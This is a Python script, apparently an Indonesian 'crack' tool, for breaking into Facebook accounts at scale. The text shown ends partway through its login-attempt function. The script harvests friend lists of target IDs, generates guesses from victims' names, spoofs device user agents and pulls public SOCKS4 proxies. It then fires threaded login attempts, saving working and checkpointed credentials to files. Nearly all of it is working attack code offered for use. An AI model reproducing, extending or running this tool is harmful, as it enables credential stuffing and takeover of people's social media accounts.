#-----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,datetime,time,re
from rich.console import Console as sol
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich import pretty
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen=[]
cokbrut=[]
fields=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAsep Yusup')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
	rr = random.randint; rc = random.choice
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	t=random.randrange(0,10525)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	crot=random.choice(['Win64; x64','WOW64'])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	aseph=f'Mozilla/5.0 (Windows NT 10.0; {crot} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Safari/537.36 Edge/12.{t}'
	hi=f'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36{model}'
	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5,aseph,hi])
	ugen.append(uaku2)


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
asu = random.choice([m,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def asepyusup(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
def ler():
	print(f'#----------[ MENU CRACK ]----------#')
def upin():
	print(f'#---------[ URUTAN CRACK ]---------#')
def ipin():
	print(f'#---------[ METHOD CRACK ]---------#')
#------------------[ LOGO-LAKNAT ]-----------------#
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r>> {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		asep()
		ses = requests.Session()
		cok = input('\n[!] Masukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					tok = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(tok)
					cokiew = open(".cok.txt", "w").write(cok)
					loading()
					print(f'\n[!] Login  berhasil jalankan ulang perintah nya')
				else:
					menu('\n[+] login gagal')
		
	except Exception as e:
		print('\n[!] Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('cls')
	asep()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('Selamat Datang [yellow]%s[white] Ganteng'%(my_name)))
	print(f'>> {H}Your Idz{N} : '+str(my_id))
	print(f'>> {H}Your Ip {N}: {ip}')
	print('')
	ler()
	print(f'>> {M}1{N}. {H}Crack Publik{N} ')
	print(f'>> {M}2{N}. {H}Crack Brutal{N}')
	print(f'>> {M}3{N}. {H}Crack File {N}')
	print(f'>> {M}4{N}. {H}Hasil Crack{N} ')
	print(f'>> {M}5{N}. {H}Gabung Gerup Telegram{N}')
	print(f'>> {M}0{N}. {M}Keluar {N}  ')
	asepyusup = input(f'\n>> {H}Pilih{N} : ')
	if asepyusup in ['1']:
		dump()
	elif asepyusup in ['2']:
		dump_asep()
	elif asepyusup in ['3']:
		crack_file()
	elif asepyusup in ['4']:
		result()
	elif asepyusup in ['5']:
		Gabung()
	elif asepyusup in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()

def Gabung():
	print(f'>> {M}Tunggu Sedang Di Arahkan Ke Admin{N}')
	loading()
	os.system('xdg-open https://wa.me/6285710389492?text=Hallo+izin+menggunakan+SC+ini+Bang+Asep');time.sleep(1);back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. Hasil {h}OK{x} Anda ')
	print(f'>> 2. Hasil {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		a = input(f'>> {H}masukan id target{N} : ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print(' : {}'.format(len(id)));setting()
		except Exception as e:
			print(e)
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_asep():
    try:
        token = open(".token.txt", "r").read()
        cok = open(".cok.txt", "r").read()
    except IOError:
        exit()
    try:
        kumpulkan = int(input(f">> {H}Mau Berapa Id?{N} : "))
    except ValueError:
        exit()
    if kumpulkan < 1 or kumpulkan > 1000:
        exit()
    ses = requests.Session()
    bilangan = 0
    for KOTG49H in range(kumpulkan):
        bilangan += 1
        Masukan = input(f">> {H}Masukkan Id Yang Ke {N}" + str(bilangan) + f" : ")
        uid.append(Masukan)
    for user in uid:
        try:
            head = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
            }
            if len(id) == 0:
                params = {"access_token": token, "fields": "friends"}
            else:
                params = {"access_token": token, "fields": "friends"}
            url = requests.get(
                "https://graph.facebook.com/{}".format(user),
                params=params,
                headers=head,
                cookies={"cookies": cok},
            ).json()
            for xr in url["friends"]["data"]:
                try:
                    woy = xr["id"] + "|" + xr["name"]
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        print(" : " + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        exit()
    except (KeyError, IOError):
        exit()

#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/dump/')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/dump/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/dump/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	upin()
	print(f'>> {M}1{N}. {H}Akun Old{N} ')
	print(f'>> {M}2{N}. {H}Akun New{N} ')
	print(f'>> {M}3{N}. {H}Akun Random{N} ')
	print('')
	hu = input(f'>> {H}Pilih {N}: ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	ipin()
	print('')
	print(f'>> {M}1{N}. {H}Async{N} ')
	print('')
	hc = input(f'>> {H}Pilih{N} : ')
	if hc in ['1','01']:
		method.append('async')
	elif hc in ['']:
		print('>> Pilih Yang Bener Kontol ')
		setting()
	else:
		method.append('async')
	print('')
	pwplus=input(f'>> {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'>> {H}Masukan kata sandi tambahan contoh{N} : {M}bagong,ngentod {N} \n>> {H}Saran kata sandi daeraah Target Contoh{N} :{M} kalimantan,bandung,jonggol{N}')
		pwku=input(f'>> {H}Masukkan Password Tambahan {N}: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Meretas Perawan {m}•{k}•{h}•{x} <<<<< ')
	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'>> Mainkan Mode Pesawat Setiap {m}500{x} Idz')
	print("<<-------------------------------------------------------->>")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			username,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'08')
					pwv.append(frs+'09')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'async' in method:
				pool.submit(crack,username,pwv)
			else:
				pool.submit(crack,username,pwv)
			
	print('')
	cetak(nel('\t[cyan][green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()


#--------------------[ METODE-MOBILE ]-----------------#
def crack(username,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r{M}Crack{N} [%s%s]/[%s] {H}Live{N} : %s {K}Check {N} : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
	ua = random.choice(ugen)
	get = geturlm()
	url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
	post = posturlm()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get(get)
			data = {
    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
    "try_number": re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
    "unrecognized_tries": re.search(
        'name="unrecognized_tries" value="(.*?)"', str(link.text)
    ).group(1),
    "email": username,
    "prefill_contact_point": "",
    "prefill_source": "",
    "prefill_type": "",
    "first_prefill_source": "",
    "first_prefill_type": "",
    "had_cp_prefilled": "true",
    "had_password_prefilled": "false",
    "is_smart_lock": "false",
    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
    "encpass": "#PWD_BROWSER:0:{}:{}".format(
        re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1), pw
    ),
    "fb_dtsg": "",
    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "__dyn": "",
    "__csr": "",
    "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
    "__a": "",
    "__user": 0,
}

			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			head = {
    "Host": url,
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
